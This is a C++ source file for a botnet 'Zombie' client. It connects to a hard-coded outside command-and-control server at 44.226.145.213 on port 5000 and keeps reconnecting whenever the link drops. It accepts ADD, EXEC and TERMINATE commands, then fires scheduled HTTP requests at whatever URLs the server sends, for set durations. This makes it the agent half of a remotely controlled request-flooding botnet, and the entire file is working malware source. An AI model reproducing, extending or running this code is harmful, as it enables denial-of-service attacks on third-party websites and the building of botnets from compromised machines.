#include "TaskScheduler.h"
#include <iostream>
#include <queue>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <cstring>
#include <functional>
#include <string>
#include <sstream>
#include <ctime>
#include <iomanip>
#include <curl/curl.h>
#include <sys/select.h>
#include <map>
#include <vector>

using namespace std;

#define PORT 5000
// #define HOST "127.0.0.1"
// #define HOST "192.168.1.77"
#define HOST "44.226.145.213"

enum COMMANDS { ADD, EXEC, TERMINATE };
string COMMANDS_TAGS [] = { "ADD", "EXEC", "TERMINATE" };

std::map<std::string, int> COMMAND_MAP = {
    {"ADD", 0},
    {"EXEC", 1},
    {"TERMINATE", 2},
    {"SHUTDOWN", 3}
};

std::map<int, std::string> REVERSE_COMMAND_MAP = {
    {0, "ADD"},
    {1, "EXEC"},
    {2, "TERMINATE"},
    {3, "SHUTDOWN"}
};

struct ChronoLink {
    std::string url;
    time_t time;
    int code;
    int duration;

    std::string get_command() {
        std::stringstream ss;
        ss << REVERSE_COMMAND_MAP[code] << " | " << url << " | " << std::to_string(time) << " | " << code << " | " << duration;
        return ss.str();
    }

    std::string trim(const std::string& s) {
        std::string trimmed = s;
        trimmed.erase(std::remove_if(trimmed.begin(), trimmed.end(), ::isspace), trimmed.end());
        return trimmed;
    }
    
    ChronoLink read_command(const std::string& command) {
        std::stringstream ss(command);
        std::string token;
        std::vector<std::string> parts;
    
        while (std::getline(ss, token, '|')) {
            parts.push_back(trim(token));
        }
    
        if (parts.empty()) {
            std::cerr << "Command is empty." << std::endl;
            return {};
        }
    
        if (parts[0] != "ADD") {
            ChronoLink link;
            link.code = COMMAND_MAP[parts[0]];
            return link;
        }

        if (parts.size() == 5) {
            try {
                std::string url = parts[1];
                time_t time = std::stoll(parts[2]); // Use stoll for time
                int code = std::stoi(parts[3]);
                int duration = std::stoi(parts[4]);
                ChronoLink link = {url, time, code, duration};
                std::cout << "COMMAND EXECUTED: " << link.get_command() << std:: endl;
                return link;
            } catch (const std::invalid_argument& e) {
                std::cerr << "Invalid argument: " << e.what() << std::endl;
            } catch (const std::out_of_range& e) {
                std::cerr << "Out of range: " << e.what() << std::endl;
            }
        } else {
            std::cerr << "Failed to parse the values correctly." << std::endl;
        }
    
        return {};
    }    
};

class Http {
private:
    CURL* curl;

public:
    Http() {
        curl = curl_easy_init();
    }

    ~Http() {
        if (curl) {
            curl_easy_cleanup(curl);
        }
    }

    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, string* output) {
        size_t total_size = size * nmemb;
        output->append((char*)contents, total_size);
        return total_size;
    }

    void make_request(const string& url) {
        thread([url]() {
            CURL* curl = curl_easy_init();
            if (!curl) {
                cerr << "Failed to initialize CURL" << endl;
                return;
            }
    
            string response;
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    
            CURLcode res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;
            } else {
                cout << "200 OK." << endl;
            }
    
            curl_easy_cleanup(curl);
        }).detach();
    }    
};

class Zombie {
private:
    queue<ChronoLink> tasks;
    int sock;
    TaskScheduler scheduler;
    Http http;

public:
    Zombie() : sock(0), scheduler(), http() {}

    bool connect_to_server() {
        struct sockaddr_in serv_addr;
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            cerr << "Socket creation error" << endl;
            return false;
        }

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);

        if (inet_pton(AF_INET, HOST, &serv_addr.sin_addr) <= 0) {
            cerr << "Invalid address/Address not supported" << endl;
            return false;
        }

        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            cerr << "Connection Failed. Retrying..." << endl;
            close(sock);
            return false;
        }
        
        cout << "Connected to server" << endl;
        return true;
    }

    void run_task(ChronoLink task) {
        if (task.url.empty()) {
            cerr << "Execution failed. No URL available!" << endl;
            return;
        }

        time_t now = time(0);
        time_t seconds = task.time;

        if (seconds == date_to_seconds("1970-01-01 00:00:00"))
            seconds = now;

        int delay = difftime(seconds, now);
        std::cout << "Delay: " << delay << " seconds.\n" << "Duration: " << task.duration << " seconds." << std::endl;

        function<void()> fun = [&]() { http.make_request(task.url); };
        scheduler.schedule(fun, delay);

        this_thread::sleep_for(chrono::seconds(task.duration));
        scheduler.stopScheduler();

        cout << "Executing task: " << task.url << " at " << seconds_to_string(seconds) << endl;
    }

    void execute_tasks() {
        while (!tasks.empty()) {
            ChronoLink task = tasks.front(); tasks.pop();
            if (task.url.empty()) continue;
            run_task(task);
        }
    }

    void proccess_tasks(ChronoLink task) {
        // std::cout << task.get_command() << std::endl;
        switch (task.code) {
            case ADD:
                tasks.push(task);
                break;
            case EXEC:
                execute_tasks();
                break;
            case TERMINATE:
                cout << "Terminating..." << endl;
                close(sock);
                exit(0);
            default:
                cerr << "Unknown command" << endl;
                break;
        }
    }

    void get_tasks() {
        char buffer[1024] = {0};
        int valread;

        while (true) {
            while ((valread = read(sock, buffer, 1024)) > 0) {
                string COMMAND(buffer, valread);
                ChronoLink task;
                task = task.read_command(COMMAND);
                proccess_tasks(task);
                fflush(stdout); // Flush the output buffer after each task
            }

            cerr << "Disconnected from server. Retrying connection..." << endl;
            close(sock);

            while (!connect_to_server()) {
                cerr << "Reconnection attempt failed. Retrying in 5 seconds..." << endl;
                sleep(5);
            }

            cout << "Reconnected to server. Resuming task retrieval." << endl;
        }
    }

    time_t date_to_seconds(const string& dateTime) {
        tm tm = {};
        istringstream ss(dateTime);

        ss >> get_time(&tm, "%Y-%m-%d %H:%M:%S");

        if (ss.fail()) {
            cerr << "Failed to parse date and time" << endl;
            return -1;
        }

        time_t seconds_since_epoch = mktime(&tm);

        if (seconds_since_epoch == -1) {
            cerr << "Error converting date and time to seconds since epoch" << endl;
            return -1;
        }

        return seconds_since_epoch;
    }

    std::string seconds_to_string(std::time_t raw_time) {
        std::tm* timeinfo = std::localtime(&raw_time);
        std::ostringstream oss;
        oss << std::put_time(timeinfo, "%Y-%m-%d %H:%M:%S");
        return oss.str();
    }
};

int main() {
    Zombie client;
    
    while (!client.connect_to_server()) {
        cerr << "Reconnection attempt failed. Retrying in 5 seconds..." << endl;
        sleep(5);
    }

    client.get_tasks();

    return 0;
}